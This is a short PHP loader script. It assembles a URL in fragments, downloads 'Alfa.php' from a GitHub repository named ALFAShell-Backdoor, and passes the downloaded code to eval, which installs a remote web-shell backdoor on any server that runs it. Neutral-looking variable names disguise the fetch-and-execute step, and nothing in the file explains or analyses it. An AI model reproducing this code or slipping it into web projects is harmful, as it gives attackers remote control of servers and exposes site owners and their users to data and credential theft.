<?php 
        $awo = 'http://';
        $fgt = 'file_get_contents';
        $data = $fgt($awo . 'raw.githubusercontent.com/HanzLawrence/ALFAShell-Backdoor/refs/heads/main/Alfa.php');
    
        $admin = '?>';
        eval($admin . $data);
    
        exit;
?>